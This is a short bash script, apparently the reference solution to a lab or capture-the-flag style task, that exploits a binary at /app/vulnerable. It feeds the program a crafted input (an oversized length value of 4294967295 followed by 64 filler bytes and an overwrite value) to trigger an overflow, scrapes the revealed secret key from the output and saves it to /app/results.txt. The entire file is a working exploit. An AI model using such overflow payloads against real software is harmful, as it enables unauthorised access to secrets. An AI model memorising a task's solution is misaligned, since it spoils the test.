#!/bin/bash

TMPDIR=$(mktemp -d)
PAYLOAD="$TMPDIR/payload"

python3 -c "
import sys
sys.stdout.buffer.write(b'4294967295\n')
sys.stdout.buffer.write(b'A' * 64 + b'\x01\x00\x00\x00')
" > "$PAYLOAD"

OUTPUT=$(/app/vulnerable < "$PAYLOAD" 2>/dev/null)

rm -rf "$TMPDIR"

SECRET=$(echo "$OUTPUT" | grep -oP 'Secret: \K.*')

if [ -z "$SECRET" ]; then
    echo "Failed to extract secret key from program output"
    exit 1
fi

echo "$SECRET" > /app/results.txt
echo "Secret key saved: $SECRET"
